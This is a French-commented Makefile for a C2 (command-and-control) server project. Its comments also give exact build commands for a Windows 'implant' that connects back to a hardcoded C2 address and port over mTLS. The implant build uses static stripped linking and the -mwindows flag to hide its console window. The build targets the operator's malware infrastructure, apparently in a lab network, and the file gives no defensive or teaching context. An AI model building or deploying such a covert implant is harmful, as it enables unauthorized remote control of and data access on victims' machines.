# Makefile — C2 server (Linux)
#
# ── Prérequis ──────────────────────────────────────────────────────────────────
#   C2 Ubuntu : sudo apt install gcc libssl-dev openssl -y
#
# ── Cibles ─────────────────────────────────────────────────────────────────────
#   make server          → c2_server   (Linux)
#   make certs [C2_IP=…] → génère les certificats mTLS dans certs/
#   make clean
#
# ── Compilation de l'implant (Windows) ─────────────────────────────────────────
#   L'implant se compile nativement sur Windows avec MSYS2 MINGW64.
#   Dans le terminal MSYS2 MINGW64 :
#
#     pacman -S mingw-w64-x86_64-gcc mingw-w64-x86_64-openssl   # une seule fois
#
#     gcc -Wall -Wextra -O2 \
#         -DC2_IP=\"192.168.56.104\" -DC2_PORT=4444 \
#         -o implant.exe implant.c tls.c \
#         -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -static -s -mwindows
#
#   Debug (affiche les erreurs TLS dans une fenêtre console) : retirer -mwindows

CC      = gcc
CFLAGS  = -Wall -Wextra -O2
LIBS    = -lssl -lcrypto

C2_IP   ?= 192.168.56.104
C2_PORT ?= 4444

.PHONY: all server certs clean

all: server

server: c2_server.c tls.c tls.h
	$(CC) $(CFLAGS) -o c2_server c2_server.c tls.c $(LIBS)
	@echo "[+] c2_server compilé"

certs:
	@bash gen-certs.sh $(C2_IP)

clean:
	rm -f c2_server implant.exe implant_debug.exe *.o
